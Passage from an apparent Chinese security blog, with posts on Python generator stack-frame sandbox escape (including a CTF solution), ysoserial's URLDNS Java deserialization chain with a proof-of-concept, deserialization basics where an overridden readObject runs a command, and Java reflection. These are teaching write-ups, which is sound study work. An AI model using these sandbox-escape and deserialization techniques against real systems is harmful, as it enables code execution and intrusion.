解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。 栈帧包含了以下几个重要的属性： f_locals: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。 f_globals: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。 f_code: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。 f_lasti: 整数，表示最后执行的字节码指令的索引。 f_back: 指向上一级调用栈帧的引用，用于构建调用栈。 ","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:2","tags":["python","沙箱逃逸"],"title":"python栈帧沙箱逃逸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["漏洞学习"],"content":"三、生成器的属性 gi_code: 生成器对应的code对象。 gi_frame: 生成器对应的frame（栈帧）对象。 gi_running: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。 gi_yieldfrom：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。 gi_frame.f_locals：一个字典，包含生成器当前帧的本地变量。 着重介绍一下 gi_frame 属性 gi_frame 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。 例子： def my_generator(): yield 1 yield 2 yield 3 gen = my_generator() # 获取生成器的当前帧信息 frame = gen.gi_frame # 输出生成器的当前帧信息 print(\"Local Variables:\", frame.f_locals) print(\"Global Variables:\", frame.f_globals) print(\"Code Object:\", frame.f_code) print(\"Instruction Pointer:\", frame.f_lasti)同理利用gi_code属性也可以获得生成器的相关代码对象属性： def my_generator(): yield 1 yield 2 yield 3 gen = my_generator() # 获取生成器的当前代码信息 code = gen.gi_code # 输出生成器的当前代码信息 print( code.co_name) print(code.co_code) print( code.co_consts) print(code.co_filename)","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:3","tags":["python","沙箱逃逸"],"title":"python栈帧沙箱逃逸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["漏洞学习"],"content":"四、利用栈帧沙箱逃逸 原理就是通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表 一个简单的例子： s3cret=\"this is flag\" def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 b = frame.f_globals['s3cret'] #返回并获取前一级栈帧的globals print(b) b=waff()或者： s3cret=\"this is flag\" def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 b = frame.f_back.f_globals['s3cret'] #返回并获取前一级栈帧的globals print(b) b=waff()为什么都行呢，可以把frame这个栈帧对象打印看看： 分别是： \u003cframe at 0x0000020F97255040, file 'D:\\\\yinwenmingtwo\\\\PythonCode\\\\测试\\\\1.py', line 9, code waff\u003e \u003cframe at 0x00000176546465B0, file 'D:\\\\yinwenmingtwo\\\\PythonCode\\\\测试\\\\1.py', line 13, code \u003cmodule\u003e\u003e在看看上面的f_globals: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。 不难看出这里函数和模块本就同在一个全局，所以都有属性s3cret，怎么看到没到全局？直接看file就能看出。 在给个例子： s3cret=\"this is flag\" codes=''' def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 print(frame) print(frame.f_back) print(frame.f_back.f_back) b = frame.f_back.f_back.f_globals['s3cret'] #返回并获取前一级栈帧的globals return b b=waff() ''' locals={} code = compile(codes, \"test\", \"exec\") exec(code,locals) print(locals[\"b\"])运行结果： 这个其实得从下向上看，最先的帧是exec，然后是b=，最后是8line那里的代码。一步一步回到全局变量 ","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:4","tags":["python","沙箱逃逸"],"title":"python栈帧沙箱逃逸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["漏洞学习"],"content":"五、简单绕过 next过滤可以用list，send，和生成器表达式进行绕过， yield过滤也可以用生成器表达式进行绕过 ","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:5","tags":["python","沙箱逃逸"],"title":"python栈帧沙箱逃逸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["漏洞学习"],"content":"六、例题 2024L3HCTF import sys import os codes=''' \u003c\u003ccodehere\u003e\u003e ''' try: codes.encode(\"ascii\") except UnicodeEncodeError: exit(0) if \"__\" in codes: print(\"__ bypass!!\") exit(0) codes+=\"\\nres=factorization(c)\" print(codes) locals={\"c\":\"696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863\",\"__builtins__\": None} res=set() def blackFunc(oldexit): def func(event, args): blackList = [\"process\",\"os\",\"sys\",\"interpreter\",\"cpython\",\"open\",\"compile\",\"__new__\",\"gc\"] for i in blackList: if i in (event + \"\".join(str(s) for s in args)).lower(): print(\"noooooooooo\") print(i) oldexit(0) return func code = compile(codes, \"\u003cjudgecode\u003e\", \"exec\") sys.addaudithook(blackFunc(os._exit)) exec(code,{\"__builtins__\": None},locals) print(locals) p=int(locals[\"res\"][0]) q=int(locals[\"res\"][1]) if(p\u003e1e5 and q\u003e1e5 and p*q==int(\"696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863\")): print(\"Correct!\",end=\"\") else: print(\"Wrong!\",end=\"\")就是可以执行一些命令，满足下面的if条件就行。 做了一些过滤，过滤掉了双下划线，{\"__builtins__\": None} 置空了__builtins__。 这里的if条件是：首先p和q都得大于100000，其次就是p和q的积为int(“69…97863”) 按照题目要求，如果通过算法在要求的5秒实现基本上是不可能的，但是我们可以通过沙箱外的globals的__builtins__字段去修改int函数，实现绕过if语句，这道题的解题思路就是通过栈帧对象逃逸出沙箱从而获取到沙箱外的globals。 由于这里的{\"__builtins__\": None} 置空了__builtins__，那么就无法使用next()和send()了。但还可以使用生成器的表达式，为什么必须用生成器，主要还是因为它的属性gi_frame可以获得当前栈帧对象，当然sys._getframe()等也可以获得栈帧对象，不过需要引入sys模块。 用生成器的表达式获得栈帧对象 a=(a.gi_frame.f_back.f_back for i in [1]) print(a) a=[x for x in a][0] print(a)简单解释一下：看来上面的生成器表达式这里其实就是，先执行i=1，然后执行a.gi_frame.f_back.f_back，这里并没有用到生成器的特性，只是单纯利用生成器来获得栈帧属性。 a=[x for x in a][0]等价于next(a)和list(a)，就是迭代执行嘛。至于两个f_back是从下依次向上返回。 \u003cframe at 0x000001C18B6BA130, file 'D:\\\\yinwenmingtwo\\\\Pyt","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:6","tags":["python","沙箱逃逸"],"title":"python栈帧沙箱逃逸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["javasec"],"content":"配置调试ysoserial 下载项目ysoserial：https://github.com/frohoff/ysoserial idea打开，在pom.xml下载好需要用的所有依赖。下载依赖的时候一定要把配置文件全勾上： 下载完成，看到没有报错后，就可以开始调试ysoserial了。在 pom.xml 中找到入口类： 跟踪入口类，右键点击调试发现只会打印uage信息： 这是因为我们没有传入参数，需要进行调试配置： 然后再次点击调试，发现序列化成功(呃，上面的地址需要加个http://头)： 然后就可以通过打断点对ysoserial的URLDNS链进行调试了。 ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:1:0","tags":["java","反序列化"],"title":"URLDNS链分析","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"URLDNS链分析 URLDNS 是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点： 不限制jdk版本，使用Java内置类，对第三方依赖没有要求 目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞 URLDNS利用链，只能发起DNS请求，并不能进行其他利用 学了前面的java序列化，我们知道了要想利用反序列化漏洞就得要重写readObject，不然连最基本的反序列化都做不到。 ysoserial在URLDNS.java中已经写出了利用链： Gadget Chain: HashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode()先看URLDNS.java类（属于ysoserial工具自己的类）： 这个类继承了一个泛型为对象的接口，然后第一步先实例化了一个handler，SilentURLStreamHandler这个类继承了URLStreamHandler，并重写openConnection和getHostAddress方法返回空，这个作用后面在说。 之后创建hashMap、URL对象，然后将URL对象，也就是DnsLog的地址put进hashmap（这个put方法后面在跟进细说）。 然后通过反射调用重置hashCode的值为-1，再返回（作后面再说）。 可以看出：最终的payload结构是一个HashMap，里面包含了 一个修改了HashCode为-1的URL类。 跟进到HashMap类 可以看到HashMap是个泛型可以接受类，并且继承了Serializable接口，可以实现序列化和反序列化。 反序列化时会调用readObject函数，搜索发现这里重写的readObject()函数。 红框上面的就是一些对传入数据的检测，方法中最关键的就是红框部分，可以看出通过反序列化取出了k和v并对其调用putVal方法。 跟进行putVal方法没有什么好看的，就是把k和v放入table中。 回到readObject的putVal方法里面还调用了hash方法处理我们传入key。 跟进hash()，看到这个方法的内容并不多。 会先判断key是否为空，不是空就调用hashCode来获取值的哈希码（即生成哈希值）。这里让 key 为 URL 对象，那么key.hashCode()调用URL类中的hashCode方法：java.net.URL#hashCode，跟进一下。 如果hashCode不等于-1则直接返回，表示已经算过了，否则就调用handler类里面的hashCode方法。上面可以看到hashCode默认就是-1。 那么可以跟进handler的hashCode方法， getHostAddress是获取ip地址，跟进一下getHostAddress方法，到达最终利用场景。 可以看到其逻辑，判断是否有主机名，有就直接返回，没有就执行getByName触发解析然后返回。 那么链子主要的就这些了，但怎么感觉这个链子似乎和我们的payload没有关系呢。确实没有关系，这里分析的URLDNS链是利用链也就是说可以传入payload到readObject进行利用最后会造成DNS解析。 ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:2:0","tags":["java","反序列化"],"title":"URLDNS链分析","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"ysoserial生成payload分析 这里生成paylaod是进行的序列化，利用的writeObject方法来把url进行序列化，从上面的URLDNS类不难看到其调用了hashMap的put方法，跟进put方法： 发现也是putVal方法，后面的就和readObject中一样了，会对url进行解析。但为什么在生成payload时明明调用了put方法却在DNSlog并没有收到请求呢。 回到最开始说的，发现重写了openConnection和getHostAddress方法使其返回为空，在调试时从put方法步过也可以看到直接到了return null，所以上面重写的目的就是为了防止在生成payload时发起DNS解析，至于重写openConnection方法的作用是实现类必须实现父类的所有抽象方法。但是如果看到我下面进行验证时会发现readObject在调用时为什么又会进行解析。 其实具体调用哪个类的getHostAddress方法是由handler来看的，跟进hanlder发现put时的handler是： 而在反序列化时，URLStreamHandler是由transient修饰的，被transient修饰的变量无法被序列化，所以最终反序列化读取出来的transient依旧是其初始值，也就是URLStreamHandler，所以最后还是调用的URLStreamHandler的getHostAddress方法。 那么生成payload时把hashCode设为-1又是为什么呢。这是因为在前面HashMap#put时已经调用过一次hashCode()函数，hashCode的值会改变不再为-1，那么进行漏洞验证传入readObject时就会直接返回HashCode值了。所以还得利用反射来让hashCode变为-1。 综上怎么感觉put这么麻烦又会触发dns解析又会让hashCode不为-1，就不能去掉吗？ 这里就要看进行序列化时重写的writeObject方法了： 看到就是将对象的默认序列化写入到输出流和将 buckets 变量的值和size变量的值写入到输出流。还有就是有个自定义的方法，跟进看看： 可以发现它让tab值等于table值，然后从中取出键值进行序列化。那么这个table是哪来的呢？ 就是put方法中的putVal改变的。所以需要调用put方法才能成功序列化。至于反序列就和table没有关系了，就是正常的进行反序列化拿到kv值。 ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:3:0","tags":["java","反序列化"],"title":"URLDNS链分析","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"ysoserial验证整条URLDNS链子 最后可以利用PayloadRunner.run()来进行一次完成的利用。 配置好参数后开始条调试： 继续向下运行，可以看到对payload进行了序列化， 调用的序列化函数writeObject是hashMap重写后的 继续向下，接下来要进行的是反序列化。 跟进发现调用的就是hashMap的readObject方法。 readObject后面的内容我们就熟悉了，上面也说了readObject下面调用的getHostAddress就是URLStreamHandler类的，所以最后执行会有一次解析，在dnslog平台可以看到。 至此工具ysoserial的由生成payload到执行payload的链子就这样了。 ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:4:0","tags":["java","反序列化"],"title":"URLDNS链分析","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"poc链调试 如果把ysoserial的整个URLDNS链理清楚了，其实就可以自己编写payload进行调试了。 poc： import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.net.URL; import java.util.HashMap; import java.lang.reflect.Field; public class URLDemo { public static void main(String[] args)throws Exception{ HashMap hashMap = new HashMap(); //创建HashMap的对象hashMap URL url = new URL(\"http://2faede01.log.dnslog.biz.\"); //创建URL对象，含有我们的url Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); //反射调用私有变量hashCode f.setAccessible(true); //使私有变量能够被修改 f.set(url, 10086); //不为-1就行，不触发解析，ysoserial使通过重写getHostAddress来实现的 hashMap.put(url, \"gaoren\"); //put入我们的键值，值随便什么都行 f.set(url, -1); //修改hashCode为-1 System.out.println(hashMap); //序列化，参考java序列化 try { FileOutputStream out=new FileOutputStream(\"dnsser.bin\"); ObjectOutputStream objout=new ObjectOutputStream(out); objout.writeObject(hashMap); objout.close(); out.close(); //反序列化，参考java反序列化 FileInputStream in=new FileInputStream(\"dnsser.bin\"); ObjectInputStream objin=new ObjectInputStream(in); objin.readObject(); objin.close(); in.close(); } catch (Exception e) { e.printStackTrace(); } } }看上面的注释应该不难理解这串代码。因为使HashMap重写了readObject方法，漏洞在它，所以这里是创建的它的对象，调用它的序列化和反序列化方法。 进行调试： 看到到了writeObject方法进行序列化。也就是ysoserial生成payload的步骤。 继续向下： 看到是readObject了，进行反序列化触发链子了，这个就不分析了，和上面的一摸一样。最后在dnslog平台可以看到请求： 也可以进行字节的序列化和反序列化： import java.io.*; import java.net.URL; import java.util.HashMap; import java.lang.reflect.Field; public class URLDemo { public static void main(String[] args)throws Exception{ HashMap hashMap = new HashMap(); URL url = new URL(\"http://2faede01.log.dnslog.biz.\"); Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url, 10086); hashMap.put(url, \"gaoren\"); f.set(url, -1); System.out.println(hashMap); try { ByteArrayOutputStream out=new ByteArrayOutputStream(); ObjectOutputStream objout=new ObjectOutputStream(out); objout.writeObject(hashMap); objout.close(); out.close(); byte[] ObjectBytes=out.toByteArray(); ByteArrayInputStream in=new ByteArrayInputStream(ObjectBytes); ObjectInputStream objin=new ObjectInputStream(in); objin.readObject(); objin.close(); in.close(); } catch (Exception e) { e.printStackTrace(); } } }如果有生成的payload想进行验证，也可以直接之构造反序列化的方法： import java.io.*; public class main { public static void main(String[] args) throws IOException, ClassNotFoundException { FileInputStream fis = new FileInputStream(\"out.bin\"); ObjectInputStream bit = new ObjectInputStream(fis); bit.readObject(); } }跟踪调试，效果是一样的。 参考： https://www.cnblogs.com/nice0e3/p/13772184.html#0x03-urldns%E9%93%BE%E5%88%86%E6%9E%90 https://www.anquanke.com/post/id/261724#h3-10 https://www.cnblogs.com/gk0d/p/16874157.html https://www.freebuf.com/articles/web/327710.html https://xz.aliyun.com/t/9417?time__1311=n4%2BxuDgD9AYCqGKDQeDsR32Ehei%3DttDRCBoD\u0026alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-1 ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:5:0","tags":["java","反序列化"],"title":"URLDNS链分析","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"序列化反序列化基础 在Java语言中，实现序列化与反序列化的类： 位置： Java.io.ObjectOutputStream java.io.ObjectInputStream 序列化： ObjectOutputStream类 –\u003e writeObject() 注：该方法对参数指定的obj对象进行序列化 ，把字节序列写到一个目标输出流中，按Java的标准约定是给文件一个.ser扩展名 反序列化:　ObjectInputStream类 –\u003e readObject() 注：该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 java在序列化一个对象时，会调用writeObject方法，参数类型时ObjectOutputStream，开发者可以将任何内容写入这个Stream中；反序列化时会调用readObject，可以从中读取到前面写入的内容，并进行处理。 字符串序列化: import java.io.*; public class Main implements Serializable { //定义序列化的方法吗，将对象转化为字节流 public static byte[] serialize(final Object obj) throws IOException { ByteArrayOutputStream out = new ByteArrayOutputStream(); //创建一个字节数组输出流 ObjectOutputStream objOut = new ObjectOutputStream(out); //创建对象输出流 objOut.writeObject(obj); //将传入对象进行序列化 System.out.println(out.toString()); //打印序列化内容 return out.toByteArray(); //转换为字节数组 //所以序列化一开始就是创建输出流，可以是字节文件、字节数组或者字节流，然后再创建对象输出流，最后调用writeObject进行序列化，还可以将对象流转换为字节流进行返回。 } //定义反序列化的方法，将字节流转化为对象 public static Object deserialize(byte[] serialized) throws IOException, ClassNotFoundException { ByteArrayInputStream in = new ByteArrayInputStream(serialized);//将字节数组转化为字节输入流 ObjectInputStream objIn = new ObjectInputStream(in);//在将字节输入流初始化为对象输入流 return objIn.readObject(); //返回反序列化对象 //反序列化就是将字节流先变为字节输入流，然后再是对象输入流，最后进行反序列化。 } public static void main(String[] args) throws IOException, ClassNotFoundException { String s = \"hello\"; byte[] ObjectBytes=serialize(s); String after = (String) deserialize(ObjectBytes); //把对象转换为字符串 System.out.println(after); } }运行结果： 发现通过字节来看序列化内容可读性太低了，可以把序列化内容写入文件中： import java.io.*; public class Main implements Serializable { //定义序列化的方法吗，将对象转化为字节流 public static void serialize(final Object obj) throws IOException { FileOutputStream files=new FileOutputStream(\"ser.bin\"); //创建一个文件类型对象 ObjectOutputStream objfiles = new ObjectOutputStream(files); //并将文件类型对象作为序列化时写入的位置 objfiles.writeObject(obj); //将传入对象进行序列化 } public static void main(String[] args) throws IOException, ClassNotFoundException { String s = \"hello\"; serialize(s); } } 对象序列化： 和字符串序列化差不多 import java.io.*; public class Main implements Serializable { //定义序列化的方法吗，将对象转化为字节流 public static byte[] serialize(final Object obj) throws IOException { ByteArrayOutputStream out = new ByteArrayOutputStream(); //创建一个字节输出流对象 ObjectOutputStream objOut = new ObjectOutputStream(out); //并将字节输出流对象作为序列化时写入的位置 objOut.writeObject(obj); //将传入对象进行序列化 System.out.println(out.toString());//打印序列化内容 return out.toByteArray(); } //定义反序列化的方法，将字节流转化为对象 public static Object deserialize(byte[] serialized) throws IOException, ClassNotFoundException { ByteArrayInputStream in = new ByteArrayInputStream(serialized);//将字节数组转化为字节输入流 ObjectInputStream objIn = new ObjectInputStream(in);//放入ObjectInputStream对象中待序列化 return objIn.readObject().getClass(); //readObject()就能返回序列化对象，加个getClass()更直观 } public static void main(String[] args) throws IOException, ClassNotFoundException { People people = new People(\"ZhangSan\", \"boy\", 18);//People对象，需要在创个People.java文件 byte[] ObjectBytes=serialize(people); Object after = deserialize(ObjectBytes); System.out.println(after); } }结果： 依然可以写入文件： import java.io.*; public class SerializableTest { public static void serialize(Object obj) throws Exception{ ObjectOutputStream files=new ObjectOutputStream(new FileOutputStream(\"ser2.bin\")); files.writeObject(obj); } public static void main(String[] args) throws Exception{ People people = new People(\"ZhangSan\", \"boy\", 18); serialize(people); } } 注意点： 实现Serializable和Externalizable接口的类的对象才能被序列化，最下面有解释。 Externalizable 接口继承自 Serializable 接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以采用默认的序列化方式。 实现java.io.Serializable接口才可被反序列化，而且所有属性必须是可序列化的(用transient 关键字修饰的属性除外，不参与序列化过程) 对象序列化包括如下步骤： 1、创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流； 2、通过对象输出流的writeObject()方法写对象。对象反序列化的步骤如下： 1、创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流； 2、通过对象输入流的readObject()方法读取对象。","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:1:0","tags":["java","反序列化"],"title":"java反序列化","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"java反序列化漏洞 原理： 如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。从上面可以看到java序列化内容相比php还是比较难读的，所以很难直接构造恶意命令，但依然可以通过重写readObject来进行漏洞利用。 利用： 我们可以在People类中重写readObject方法。 private void readObject(java.io.ObjectInputStream ois) throws java.io.IOException,ClassNotFoundException{ ois.defaultReadObject(); //默认进行反序列化 Runtime.getRuntime().exec(\"calc.exe\");//多执行的命令 }运行： 那可能会好奇为什么这里重写了如readObject的方法就会执行这个readObject方法呢，同样在最下面进行了解释。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:2:0","tags":["java","反序列化"],"title":"java反序列化","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"ysoserial工具 ysoserial是java反序列化漏洞的一个工具。可以直接下载编译好的jar文件，直接就能用。 https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar或者下载源码自己进行编译，建议这样做因为方便查看 poc 的源码。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:3:0","tags":["java","反序列化"],"title":"java反序列化","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"反序列化底层分析 参考：https://www.cnblogs.com/yyhuni/p/15127416.html 反序列化的 demo， package org.example; import java.io.*; public class sertest { public static void main(String[] args) throws Exception{ people p=new people(\"gaoren\"); ser(p); deser(\"test.bin\"); } public static class people implements Serializable{ private String name; people (String name){ this.name=name; } } public static void ser(Object obj)throws Exception{ FileOutputStream out=new FileOutputStream(\"test.bin\"); ObjectOutputStream objout=new ObjectOutputStream(out); objout.writeObject(obj); } public static void deser(String filename)throws Exception{ FileInputStream in =new FileInputStream(filename); ObjectInputStream objin=new ObjectInputStream(in); Object obj=objin.readObject(); } }然后利用 SerializationDumper 查看生成的字节流， java -jar SerializationDumper-v1.13.jar -r test.bin TC_OBJECT：标记后面的数据为Object对象 TC_CLASSDESC：类描述符标识，表示一个类中的所有信息 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:4:0","tags":["java","反序列化"],"title":"java反序列化","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"调试分析 在 Object obj=objin.readObject(); 处下个断点，一路跟到 ObjectInputStream#readObject 方法，在其中调用了 readObject0 跟进，在此函数中，根据了tc值来进行switch，此时的tc值为TC_OBJECT，也就是0x73十进制数115 然后在 case TC_OBJECT 中，调用了 readOrdinaryObject， 跟进readOrdinaryObject中，发现调用了readClassDesc方法，并把值赋给了desc 继续跟进 readClassDesc，此方法用来分发处理字节流中 TC_CLASSDESC 的方法，用switch来选择需要处理的方法，这里tc的值就是 TC_CLASSDESC 的值0x72，转成10进制就是114，然后进入switch判断后转到 case TC_CLASSDESC: 跟进到 readNonProxyDesc 方法中，调用了resolveClass 再 resolveClass 中，通过 Class.forName 来实例化了 people 对象，然后返回对象。 回到 readNonProxyDesc 方法中，时cl值变成了 people 对象，然后把cl对象传入了 initNonProxy，并且赋值给了desc， 然后返回 desc 赋值给了descriptor 最后回到 readOrdinaryObject 方法中，此时的 desc 已经是 people 对象了。 总结下上面的流程顺序为： readOrdinaryObject -》 readClassDesc -》 readNonProxyDesc -》 resolveClass， readClassDesc：分发用于处理字节流中TC_CLASSDESC的方法，用switch来选择需要处理的方法 readNonProxyDesc：真正用来处理字节流中的TC_CLASSDESC方法，会调用resolveClass进行创建反序列化的对象 resolveClass：是用Class.forName来创建ObjectA对象的地方，在这里可以做一个检查校验，用于反序列化拦截。weblogic中补丁拦截就是在此进行的 然后是 readOrdinaryObject，这里的 readOrdinaryObject 就是真正操作调用序列化类中，readObject、readResolve、readExternal方法的地方， 接着上面debug，拿到了desc的值后往下走，做了一个判断 desc.isExternalizable，如果序列化的接口是Externalizable类型，就进入readExternalData，否则进入readSerialData 此处的 people 对象接口类型是Serializable，所以进入了 readSerialData 方法， 最后 readSerialData 方法中用了反射进行调用反序列化对象的 readObject 方法 到readOrdinaryObject，接下来就是调用readResolve方法的地方了 用if进行判断，为true则用反射调用反序列化对象的 readResolve 方法，这里没有重写此方法所以为 false， 最后回到 readObject0， 到这里就是反序列化的底层逻辑了，所以需要继承 Serializable 接口，然后会反射调用反序列化对象的 readobject 方法。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:4:1","tags":["java","反序列化"],"title":"java反序列化","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"基础内容 反射调用就是指通过反射机制进行的方法调用。反射机制是Java编程语言的一个重要特性，它允许程序在运行时检查、操作和实例化类，方法，字段等，并在运行时获取类的信息以及动态调用类的方法。反射机制使得Java程序可以在运行时动态地加载、探测和使用类，而不需要在编译时就知道这些类的具体信息。 通过反射机制，可以实现以下功能： 获取类的信息：可以在运行时获取类的信息，如类的名称、父类、接口、成员变量、方法等。 实例化类：可以通过类的名称动态实例化类的对象。 调用方法：可以通过方法名动态调用类的方法。 获取字段信息：可以通过字段名获取类的字段信息。 动态代理：可以在运行时动态生成代理类，实现代理相关的功能。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:1:0","tags":["java"],"title":"java反射机制","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["javasec"],"content":"java基本反射调用 反射调用一般分为4个步骤： 类的实例化 得到要调用类的class 得到要调用的类中的方法(Method) 方法调用(invoke) obj.getClass()获得类： demo： import java.lang.reflect.Method; public class Main{ public static void main(String[] args) throws Exception{ Reflect r1= new Reflect(); //对类进行是实例化 r1.print(1,3); //直接调用 Class c = r1.getClass(); //获取实列化对象所属类的类的对象 Method m1 = c.getMethod(\"print\",int.class,int.class); //获得方法 Object i = m1.invoke(r1, 1, 2); //反射机制调用方法 } } class Reflect{ public void print(int a,int b){ System.out.println(a+b); } }上面分别是两种调用类的方法的方法 第一种是通过类的实例化直接调用， 第二种是通过类的对象用getMethod获得方法，然后利用反射机制调用方法； 至于一些函数的具体使用如getClass，getMethod,invoke可以直接问gpt。 加上throws Exception是因为getMethod()和invoke()方法会抛出NoSuchMethodException、IllegalAccessException、IllegalArgumentException等异常，可以去掉看看报错。 那么可以利用这种反射调用来调用恶意类实现rce： import java.lang.reflect.Method; public class Main{ public static void main(String[] args)throws Exception { Runtime runtime=Runtime.getRuntime(); //获得Runtime的实例化 runtime.exec(\"calc.exe\"); //实列化直接调用 Class c=runtime.getClass(); Method 